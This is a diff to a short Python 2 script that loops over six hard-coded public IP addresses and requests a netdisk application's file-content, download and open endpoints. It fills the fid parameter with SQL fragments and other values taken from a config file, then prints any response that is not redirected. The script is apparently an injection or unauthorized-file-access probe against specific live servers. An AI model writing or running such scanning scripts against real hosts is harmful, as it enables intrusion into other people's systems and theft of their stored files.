@@ -1,4 +1,6 @@
 #*--coding:utf-8--*
+from os import popen
+
 import requests
 import yaml
 import json
@@ -6,6 +8,8 @@ import json
 readyml = yaml.load(file('ini.yml'))
 api_url = readyml['api']
 sql = readyml['sql']
+fid = readyml['fid']
+'''
 print(sql)
 data = {
     'id': 'select * from sdfsf',
@@ -41,3 +45,37 @@ for x in api_url.split(' '):
 print(m)
         # print(res.content)
         # raw_input()
+'''
+
+def fids(ip, keyword, fid):
+    urls = [
+    'http://%s/space/netdisk/index.php?op=f_filecontent&igId=%s&fid=%s' % (ip, keyword, fid),
+    'http://%s/space/netdisk/index.php?op=f_downloadfile&igId=%s&fid=%s' %(ip, keyword, fid),
+    'http://%s/space/netdisk/index.php?op=f_openfile&igId=%s&fid=%s' % (ip, keyword, fid)
+    ]
+    for url in urls:
+        # print url
+        res = requests.get(url)
+        if res.history == []:
+            print url
+            print res.content
+
+print sql.split(';')
+ips = [
+    '202.108.33.171',
+    '202.108.33.176',
+    '202.108.33.224',
+    '202.108.33.233',
+    '103.29.134.108',
+    '103.29.134.109'
+       ]
+
+for m in ips:
+    for x in sql.split(';'):
+        fids(m, u"小兔子乖乖", x)
+
+    # print fid.split('=>')
+    for y in fid.split('=>'):
+        fids(m, u'小兔子乖乖', y)
+
+    print m + "-------------------------------"
